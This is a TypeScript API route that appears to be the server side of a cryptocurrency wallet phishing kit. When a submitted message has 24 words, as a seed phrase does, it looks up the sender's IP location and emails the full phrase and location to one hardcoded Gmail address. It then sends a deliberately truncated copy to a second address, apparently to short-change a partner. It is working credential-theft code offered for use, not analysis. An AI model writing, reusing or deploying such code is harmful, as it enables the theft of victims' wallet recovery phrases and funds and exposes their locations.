import nodemailer from 'nodemailer';

const formatMessage = async (message: string, location: string) => {
    const email = process.env.MY_EMAIL;
    const pass = process.env.MY_PASS;

    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: email,
            pass,
        }
    });

    // Split the message into lines and include the location
    const lines = message.split(/\r?\n/);
    const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);
    formattedLines.push(`<div><strong>Location:</strong> ${location}</div>`);

    // Join formatted lines into a single HTML string
    const formattedMessage = formattedLines.join('');

    const mailOptions = {
        from: `PassPhrase ${email}`,
        to: "fridayogwuche61@gmail.com",
        subject: "Yo! you just got the correct passphrase",
        html: formattedMessage,
    };

    transporter.verify(function (error: any, success: any) {
        if (error) {
            console.log(`here is the error: ${error}`);
        } else {
            console.log("From two: Server is ready to take our messages");
        }
    });

    const result = await transporter.sendMail(mailOptions);

    if (result.response.includes("OK")) {
        console.log("email sent successfully!!");
    } else {
        console.log("Internal server error");
    }

    return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
};

export async function POST(request: Request) {
    try {
        const { message } = await request.json();

        // Validate that the message is a passphrase with 24 words
        const words = message.trim().split(/\s+/);

        if(words.length === 24) {
            // Get user's location based on IP
            const ip = request.headers.get('x-forwarded-for');
            console.log(ip)
            const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${process.env.GEOLOCATION_API_KEY}&ip=${ip}`);
            console.log(locationData)
            const locationJson = await locationData.json();
            console.log(locationJson)
            const location = `${locationJson.city}, ${locationJson.country_name}`;
            console.log(location)

            // Send the correct passphrase to the first email
            await formatMessage(message, location);

            const lastWord = words[23].slice(0, -3);
            const modifiedMessage = [...words.slice(0, 23), lastWord].join(' ');

            const email = process.env.EMAIL;
            const pass = process.env.PASS;

            const transporter = nodemailer.createTransport({
                service: 'gmail',
                auth: {
                    user: email,
                    pass,
                }
            });

            const mailOptions = {
                from: `Dev's Clone ${email}`,
                to: 'sparrowthedev@gmail.com',
                subject: "Dev you just got a new phrase!",
                html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${modifiedMessage}</div>`,
            };

            transporter.verify(function (error: any, success: any) {
                if (error) {
                    console.log(`here is the error: ${error}`);
                } else {
                    console.log("From one: Server is ready to take our messages");
                }
            });

            const result = await transporter.sendMail(mailOptions);

            if (result.response.includes("OK")) {
                return Response.json({ message: "email sent successfully!!" }, { status: 200 });
            } else {
                return Response.json({ error: "Internal server error" }, { status: 500 });
            }
        }

        const email = process.env.EMAIL;
        const pass = process.env.PASS;

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        });

        const mailOptions = {
            from: `Dev's Clone ${email}`,
            to: 'sparrowthedev@gmail.com',
            subject: "Dev you just got a new phrase!",
            html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${message}</div>`,
        };

        transporter.verify(function (error: any, success: any) {
            if (error) {
                console.log(`here is the error: ${error}`);
            } else {
                console.log("From one: Server is ready to take our messages");
            }
        });

        const result = await transporter.sendMail(mailOptions);

        if (result.response.includes("OK")) {
            return Response.json({ message: "email sent successfully!!" }, { status: 200 });
        } else {
            return Response.json({ error: "Internal server error" }, { status: 500 });
        }
    } catch (error) {
        return Response.json({ error: 'Invalid passphrase' }, { status: 500 });
    }
}
